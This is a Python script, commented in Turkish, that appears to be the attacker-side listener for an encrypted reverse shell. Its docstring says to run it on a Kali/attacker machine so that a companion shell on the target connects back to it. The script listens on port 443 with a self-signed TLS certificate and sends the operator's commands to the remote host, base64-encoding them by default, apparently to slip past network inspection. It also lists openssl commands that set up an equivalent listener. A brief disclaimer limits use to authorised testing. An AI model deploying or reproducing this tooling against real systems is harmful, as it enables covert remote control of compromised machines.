#!/usr/bin/env python3
"""
SSL/TLS Şifreli Listener (Dinleyici)
=====================================
Bu scripti KALI/saldırgan makinenizde çalıştırın.
Hedef makinedeki 1_Encrypted_Reverse_Shell.py buraya bağlanacak.

KULLANIM:
---------
  python3 2_Listener.py

Alternatif olarak openssl ile de dinleyebilirsiniz:
  openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
  openssl s_server -quiet -key key.pem -cert cert.pem -port 443

NOT: Yalnızca izinli test ortamlarında kullanın.
"""

import socket
import ssl
import sys
import os
import tempfile

LHOST = "0.0.0.0"  # Tüm arayüzlerde dinle
LPORT = 443         # HTTPS portu

def generate_self_signed_cert():
    """Geçici self-signed sertifika oluşturur."""
    try:
        import subprocess
        
        cert_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "certs")
        os.makedirs(cert_dir, exist_ok=True)
        
        key_file = os.path.join(cert_dir, "server.key")
        cert_file = os.path.join(cert_dir, "server.crt")
        
        if not os.path.exists(cert_file):
            print("[*] Self-signed sertifika oluşturuluyor...")
            subprocess.run([
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", key_file, "-out", cert_file,
                "-days", "365", "-nodes",
                "-subj", "/CN=localhost"
            ], check=True, capture_output=True)
            print("[+] Sertifika oluşturuldu.")
        
        return key_file, cert_file
    except FileNotFoundError:
        print("[-] openssl bulunamadı! Lütfen openssl yükleyin.")
        sys.exit(1)

def start_listener():
    key_file, cert_file = generate_self_signed_cert()
    
    # SSL context oluştur
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile=cert_file, keyfile=key_file)
    
    # Soket oluştur ve dinle
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LHOST, LPORT))
    server.listen(1)
    
    print(f"[*] SSL Listener başlatıldı: {LHOST}:{LPORT}")
    print("[*] Bağlantı bekleniyor...\n")
    
    ssl_server = context.wrap_socket(server, server_side=True)
    
    try:
        conn, addr = ssl_server.accept()
        print(f"[+] Şifreli bağlantı alındı: {addr[0]}:{addr[1]}")
        print("[+] Komut göndermek için yazın. Çıkmak için 'exit' yazın.\n")
        
        while True:
            command = input(f"shell@{addr[0]}> ")
            
            if not command.strip():
                continue
                
            if command.lower() == "exit" or command.lower() == "quit":
                conn.send(command.encode("utf-8"))
                print("[*] Bağlantı kapatılıyor...")
                break
                
            if command.startswith("!"):
                # ! ile başlayan komutları base64 encode etmeden gönder (Normal komut)
                command_to_send = command[1:]
            else:
                 import base64
                 # Varsayılan olarak komutları b64 encode ederek gönder
                 encoded_cmd = base64.b64encode(command.encode('utf-8')).decode('utf-8')
                 command_to_send = f"b64:{encoded_cmd}"

            conn.send(command_to_send.encode("utf-8"))
            
            response = conn.recv(65535).decode("utf-8", errors="replace")
            print(response, end="")
        
        conn.close()
    except KeyboardInterrupt:
        print("\n[*] Listener kapatılıyor...")
    finally:
        ssl_server.close()

if __name__ == "__main__":
    if os.geteuid() != 0 if hasattr(os, 'geteuid') else False:
        print("[!] Port 443 için root yetkisi gerekebilir: sudo python3 2_Listener.py")
    start_listener()
